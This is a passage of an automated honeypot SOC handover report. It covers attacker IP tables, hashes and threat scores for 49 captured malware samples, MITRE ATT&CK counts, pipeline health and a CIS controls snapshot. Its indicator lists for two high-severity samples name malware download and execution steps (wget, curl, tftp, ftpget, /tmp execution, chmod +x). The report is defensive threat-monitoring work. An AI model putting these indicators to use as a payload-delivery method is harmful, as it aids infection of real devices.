| `199.45.154[.]115` | **2** | 2026-08-12 05:26 | 2026-08-12 05:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.104[.]94` | **2** | 2026-08-12 06:05 | 2026-08-12 06:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.235.7[.]1` | 1 | 2026-08-12 05:08 | 2026-08-12 05:08 | 11s | 0 | `T1592` | 🟢 LOW |
| `119.96.81[.]99` | 1 | 2026-08-12 05:41 | 2026-08-12 05:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | 1 | 2026-08-12 05:45 | 2026-08-12 05:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]204` | 1 | 2026-08-12 05:40 | 2026-08-12 05:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.170.144[.]19` | 1 | 2026-08-12 06:24 | 2026-08-12 06:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.138.158[.]35` | 1 | 2026-08-12 05:44 | 2026-08-12 05:44 | 15s | 0 | `T1592` | 🟢 LOW |
| `183.167.234[.]154` | 1 | 2026-08-12 04:57 | 2026-08-12 04:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.97.239[.]29` | 1 | 2026-08-12 05:42 | 2026-08-12 05:42 | 12s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | 1 | 2026-08-12 06:31 | 2026-08-12 06:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `206.189.18[.]100` | 1 | 2026-08-12 05:42 | 2026-08-12 05:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]107` | 1 | 2026-08-12 06:47 | 2026-08-12 06:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]44` | 1 | 2026-08-12 06:42 | 2026-08-12 06:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]60` | 1 | 2026-08-12 06:10 | 2026-08-12 06:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.196.178[.]230` | 1 | 2026-08-12 06:28 | 2026-08-12 06:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-12 05:34 | 2026-08-12 05:35 | 35s | 0 | `T1592` | 🟢 LOW |
| `94.67.74[.]177` | 1 | 2026-08-12 05:26 | 2026-08-12 05:26 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |
| `34.76.177[.]222` | BE | Google LLC | **100** ⚠️ | 0 |
| `119.200.229[.]33` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `47.85.8[.]171` | US | Alibaba Cloud LLC | **100** ⚠️ | 50 |
| `70.91.135[.]181` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `221.199.172[.]66` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `87.225.108[.]138` | RU | PJSC Rostelecom | **100** ⚠️ | 50 |
| `111.70.32[.]53` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `140.245.50[.]204` | SG | Oracle Corporation | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 97 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 91 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 44 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 43 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 41 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 20 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 209 cases |
| Tool 34  | Credential Extractor        | ✅ 102 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 80 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (12.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 55 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 90 priority case(s) shown individually · 32 recon entry/entries in table (16 group(s) consolidating 76 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-12T07:39:50Z_
